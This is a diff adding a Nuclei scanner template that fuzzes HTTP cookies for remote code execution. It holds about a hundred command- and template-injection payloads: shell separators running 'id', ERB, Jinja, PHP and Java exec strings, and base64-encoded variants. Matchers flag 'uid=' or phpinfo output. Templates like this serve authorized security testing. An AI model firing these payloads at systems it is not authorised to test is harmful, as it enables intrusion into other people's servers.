@@ -1,0 +1,155 @@
+id: rce-cookie
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-cookie,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+        
+    payloads:
+      rce:
+        - "$(id)"
+        - "/*$(id)`id`"
+        - "'i'd"
+        - '"i"d'
+        - '`/usr/bin/id`'
+        - '||/usr/bin/id||'
+        - '$;id'
+        - "i`u`d"
+        - "1;id"
+        - ';";id'
+        - "%2560id%2560"
+        - "%60id%60"
+        - "& `id`"
+        - "& id &"
+        - "& id"
+        - "&$(id)"
+        - "&& id"
+        - "&&$(id)"
+        - "&&`id`"
+        - "&&id"
+        - "&&id&&"
+        - "&`id`"
+        - "&id"
+        - "&id&"
+        - "'id'"
+        - ");id"
+        - ");id;"
+        - ");id|"
+        - ")id "
+        - ")|id"
+        - ")|id;"
+        - "**id**"
+        - "*id"
+        - "*id*"
+        - "; $(id)"
+        - "; `id` #"
+        - "; `id`"
+        - "; id"
+        - "; id;"
+        - "; id\n"
+        - "; id|"
+        - "; |id|"
+        - "\n&&id"
+        - "\n;id"
+        - "\nid"
+        - "\nid\n"
+        - "\n||$(id)"
+        - "\n||`id`"
+        - "\n||id"
+        - "\r&&id"
+        - "\r;id"
+        - "\r\n&&id&&"
+        - "\r\n;id"
+        - "\r\n||$(id)"
+        - "\r\n||`id`"
+        - "\r\n||id"
+        - "\r\n||id||"
+        - "\r||$(id)"
+        - "\r||`id`"
+        - "\r||id"
+        - "`id` #"
+        - "`id` &"
+        - "`id`"
+        - "`id`#"
+        - "`id`&"
+        - "a);id"
+        - "a);id|"
+        - "a;id"
+        - "a;id;"
+        - "id"
+        - "id;"
+        - "id|"
+        - "| `id` #"
+        - "| `id`"
+        - "| id"
+        - "|id"
+        - "|id;"
+        - "|id|"
+        - "|| `id` #"
+        - "|| `id`"
+        - "|| id"
+        - "||$(id)"
+        - "||$(id);"
+        - "||$(id)||"
+        - "||`id`"
+        - "||`id`||"
+        - "||id"
+        - "||id;"
+        - "||id|"
+        - "||id||"
+        - '<%= system("id") %>'
+        - '<%25+system("id")+%25>'
+        - "{% import os %}{{os.system('id')"
+        - "import os;os.system('id');"
+        - '"><?php echo system("id");?>'
+        - 'T(java.lang.Runtime).getRuntime().exec("id")'
+        - ';phpinfo();'
+        - 'echo `id`;'
+        - 'echo exec(id);'
+        - 'YGlkYA=='
+        - 'O2BpZGA7'
+        - 'O2lkOw=='
+        - 'fHxgaWRgfHw='
+        - 'JiZpZCYm'
+        
+    fuzzing:
+      - part: cookie
+        mode: single
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "'id' is not recognized as an internal or external command"
+          - "syntax error near unexpected token `"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+        
+    extractors:
+      - type: regex
+        regex:
+          - "(u|g)id=.*"
